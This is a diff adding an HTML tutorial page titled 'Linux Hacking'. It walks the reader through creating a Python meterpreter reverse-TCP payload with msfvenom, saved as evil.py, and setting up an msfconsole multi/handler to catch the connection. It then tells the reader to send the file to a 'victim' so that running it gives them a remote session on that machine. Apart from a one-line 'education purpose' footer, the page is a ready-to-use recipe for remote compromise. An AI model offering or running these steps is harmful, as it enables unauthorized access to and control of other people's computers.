@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta content="width=device-width, initial-scale=1.0" name="viewport">
+
+  <title>Linux Hacking</title>
+  <link href="img/linux.png" rel="icon">
+  <meta content="" name="descriptison">
+  <meta content="" name="keywords">
+
+ 
+
+ 
+  <!-- Vendor CSS Files -->
+  <link href="assets/vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+
+  <!-- Template Main CSS File -->
+  <link href="assets/css/style.css" rel="stylesheet">
+
+
+
+<body>
+
+  <!-- =======  Linux ======= -->
+  <section id="Linux" class="Linux">
+    <div class="container">
+
+      <div class="section-title">
+        <h2>Linux Hacking</h2>
+      </div>
+
+      <div class="row">
+        <div class="col-lg-6">
+          <h3 class="Linux-title">What We Need?</h3>
+          <div class="Linux-item pb-0">
+            <h4>1. Kali Linux Or Other</h4> 
+            <h4 Linux-item pb-0>2. Basic Knowledge About Linux</h4>
+
+            <p><em>I'm Using a Python-Based Shell</em></p>
+            <p>
+            <ul>
+              <li>Create A Payload And Send To The Victim Machine.</li>
+              <span style="color: red;">🔹 Command To Create Payload🔹</span>
+              <li>First Open Terminal</li>
+              <span style="color: red">🔹msfvenom -p python/meterpreter/reverse_tcp LHOST=[Own IP] LPORT=4444 > evil.py</span><br/>
+              <span>🔹After Finish Process. Open New Terminal And Type <span style="color: red;">Msfconsole.</span></span><br/>
+              <span style="color: red;">🔹use exploit/multi/handler</span><br/>
+              <span style="color: red;">🔹set payload python/meterpreter/reverse_tcp</span><br/>
+              <span style="color: red;">🔹set LHOST Your ip address</span><br/>
+              <span style="color: red;">🔹set LPORT 4444</span><br/>
+              <span style="color: red;">🔹exploit</span>
+            </ul>
+            </p>
+          </div>
+        </div>
+        <div class="col-lg-6">
+          <h3 class="Linux-title">Your System Is Ready To Hack Linux Machine.</h3>
+          <div class="Linux-item">
+            <h4>Send This Payload To The Victim. When Victim Execute Your Payload You'll Got Meterpreter Session.</h4>
+            <h4>It Mean's You Hacked Victim Machine.</h4>
+            <p><em>Type <span style="color: red;">help</span> Command For More.</em></p>
+            
+          </div>
+        </div>
+      </div>
+    </div>
+    </section><!-- End Linux -->
+    <footer style="text-align: center;color: red;text-shadow: 3px 3px 5px black;font-weight: bold;">
+  <spa>"That's It"<br>
+This Is Only For Education Purpose...!!</span>
+</footer>
+
+</body>
+
+</html>
